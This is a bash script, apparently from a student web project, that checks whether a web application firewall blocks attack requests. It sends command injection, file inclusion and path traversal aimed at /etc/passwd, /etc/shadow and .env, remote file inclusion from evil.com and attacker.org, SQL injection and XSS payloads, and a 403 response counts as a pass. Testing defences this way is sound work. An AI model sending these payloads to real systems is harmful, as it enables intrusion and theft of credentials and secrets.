#!/usr/bin/env bash
set -uo pipefail

GREEN=$'\033[0;32m'
RED=$'\033[0;31m'
DIM=$'\033[2m'
RESET=$'\033[0m'

HOST=transcendence.nip.io:3000

ok()   { printf "%sOK%s"   "$GREEN" "$RESET"; }
fail() { printf "%sFAIL%s" "$RED"   "$RESET"; }

total=0
passed=0

CURL_BASE=(-s -k --connect-timeout 3 --max-time 8 -o /dev/null -w "%{http_code}")

run_test() {
  local label="$1"; shift
  ((total++))

  local code
  code=$(curl "${CURL_BASE[@]}" "$@" || true)
  [[ -z "$code" ]] && code="ERR"

  if [[ "$code" == "403" ]]; then
    ((passed++))
    printf "%-6s %s %s(code: %s)%s\n" "$(ok)" "$label" "$DIM" "$code" "$RESET"
  else
    printf "%-6s %s %s(code: %s)%s\n" "$(fail)" "$label" "$DIM" "$code" "$RESET"
  fi
}

printf "%sStarting WAF checks… expecting 403 to PASS%s\n" "$DIM" "$RESET"

# ------------------------- cmd_injection -------------------------
run_test "cmd_injection | ls | cat /etc/passwd" \
  "https://$HOST/?cmd=ls%7Ccat%20/etc/passwd"

run_test "cmd_injection | cat /etc/passwd ; id" \
  "https://$HOST/?cmd=cat+/etc/passwd;id"

run_test "cmd_injection | ls | id" \
  "https://$HOST/?cmd=ls%7Cid"

run_test "cmd_injection | backticks \`id\`" \
  "https://$HOST/?cmd=\`id\`"

run_test "cmd_injection | \$(id)" \
  "https://$HOST/?cmd=\$(id)"

run_test "cmd_injection | bash -c id" \
  "https://$HOST/?cmd=bash+-c+id"

run_test "cmd_injection | /bin/sh -c id" \
  "https://$HOST/?cmd=/bin/sh+-c+id"

# ---------------------- local_file_inclusion ---------------------
run_test "LFI | page=../../../../etc/passwd" \
  "https://$HOST/?page=../../../../etc/passwd"

run_test "LFI | file=..../etc/shadow (encoded)" \
  "https://$HOST/?file=..%2F..%2F..%2F..%2Fetc%2Fshadow"

run_test "LFI | file=../../../../.env" \
  "https://$HOST/?file=../../../../.env"

run_test "LFI | file=%2e%2e%2f%2e%2e%2f%2e%2e%2f.env" \
  "https://$HOST/?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f.env"

run_test "LFI | file=%252e%252e%252f%252e%252e%252f.env (double-enc)" \
  "https://$HOST/?file=%252e%252e%252f%252e%252e%252f.env"

# ------------------------- path_traversal ------------------------
run_test "Path traversal | ..%2F..%2Fsecret.txt" \
  "https://$HOST/?path=..%2F..%2Fsecret.txt"

run_test "Path traversal | /var/www/html/../../etc/hosts" \
  "https://$HOST/?path=/var/www/html/../../etc/hosts"

# --------------------- remote_file_inclusion ---------------------
run_test "RFI | file=http://evil.com/shell.txt" \
  "https://$HOST/?file=http://evil.com/shell.txt"

run_test "RFI | template=https://attacker.org/payload" \
  "https://$HOST/?template=https://attacker.org/payload"

# ------------------------- sql_injection -------------------------
run_test "SQLi | POST login username=admin password=1' OR '1'='1" \
  -X POST "https://$HOST/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username=admin&password=1' OR '1'='1"

run_test "SQLi/XSS-ish | ?q=<script>alert(1)</script>" \
  "https://$HOST/?q=<script>alert(1)</script>"

run_test "SQLi (comment cutoff) | ?search=test'/*" \
  "https://$HOST/?search=test'/*"

# ------------------------------- xss -----------------------------
run_test 'XSS (JSON) | POST /api/comments {"comment":"<script>alert(1)</script>"}' \
  -X POST "https://$HOST/api/comments" \
  -H "Content-Type: application/json" \
  -d '{"comment": "<script>alert(1)</script>"}'

run_test "XSS | ?q=<script>alert(1)</script>" \
  "https://$HOST/?q=<script>alert(1)</script>"

run_test 'XSS | <img onerror=alert(1)>' \
  "https://$HOST/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"

run_test 'XSS | <svg onload=alert(1)>' \
  "https://$HOST/?q=%3Csvg%20onload%3Dalert(1)%3E"

# ----------------------------- Summary --------------------------
printf "\nResult: %d/%d %spassed%s, %d %sfailed%s\n" \
  "$passed" "$total" "$GREEN" "$RESET" "$((total-passed))" "$RED" "$RESET"

(( total - passed == 0 )) && exit 0 || exit 1
